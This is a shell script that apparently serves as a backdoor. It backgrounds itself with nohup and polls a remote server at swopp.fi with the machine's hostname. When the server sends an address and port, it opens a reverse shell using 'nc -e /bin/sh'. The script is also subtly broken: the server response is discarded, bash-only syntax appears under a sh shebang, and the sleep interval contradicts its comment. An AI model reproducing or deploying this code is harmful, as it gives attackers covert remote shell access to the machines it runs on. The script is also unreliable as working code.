#!/bin/sh

# If the script is not already running in the background, run it with nohup
if [ "$1" != "background" ]; then
    nohup "$0" background > /dev/null 2>&1 &
    exit 0
fi

# Script variables
CLIENT_ID="machine_$(hostname)"
SERVER_URL="https://swopp.fi/bck/check.php"
CONNECTED=0

# Infinite loop to check for assigned address and port
while true; do
    # Send curl request with nohup and redirect logs to /dev/null
    RESPONSE=$(nohup curl -s "$SERVER_URL?id=$CLIENT_ID" > /dev/null 2>&1 &)
    wait # Wait for the curl process to complete

    # Parse JSON response
    ADDRESS=$(echo "$RESPONSE" | jq -r '.address')
    PORT=$(echo "$RESPONSE" | jq -r '.port')

    if [[ "$ADDRESS" != "null" && "$PORT" != "null" ]]; then
        if [[ $CONNECTED -eq 0 ]]; then
            echo "Address found. Connecting to $ADDRESS:$PORT..."
            # Run nc command with nohup and redirect logs to /dev/null
            nohup nc $ADDRESS $PORT -e /bin/sh > /dev/null 2>&1 &
            CONNECTED=1
        else
            echo "Already connected. Continuing to monitor..."
        fi
    else
        echo "No assigned address found. Continuing to monitor..."
        CONNECTED=0
    fi

    # Wait for 2 minutes before checking again
    sleep 20
done
